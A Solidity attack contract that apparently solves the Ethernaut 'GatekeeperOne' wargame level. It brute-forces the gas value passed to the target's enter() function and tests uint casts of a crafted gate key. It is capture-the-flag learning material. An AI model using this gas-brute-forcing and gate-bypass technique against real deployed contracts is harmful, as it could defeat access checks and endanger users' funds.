// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "hardhat/console.sol";

import './GatekeeperOne.sol';
contract GatekeeperOneAttack {
    GatekeeperOne public targetContract;

    constructor(address addr) public {
        targetContract = GatekeeperOne(addr);
    }

    event Failed(uint64 a , uint16 b, uint16 c, uint32 d);
    event GasLog(bytes exception,uint gas);

    function testGateKeaperOne(bytes8 _gateKey) public {
        uint gas = 5766660; //Discoverd by discoverGas Function
        targetContract.enter{gas:gas}(_gateKey);
    }

    function discoverGas(bytes8 _gateKey) external{
        uint gas = 99999;
        for(uint i = 0; i < 8191; ++i)
        {
            gas += i;
            try targetContract.enter{gas:gas}(_gateKey) {}
            catch(bytes memory reason){
                emit GasLog(reason,gas);
            }
        }
    }

    function test() public returns(int){
        emit Failed(uint64(0x1200000010006c9B),uint16(uint64(0x1200000010006c9B)),uint16(0x1200000010006c9B),uint32(uint64(0x1200000010006c9B)) );
        return uint16(0x1200000010006c9B); 
    }
}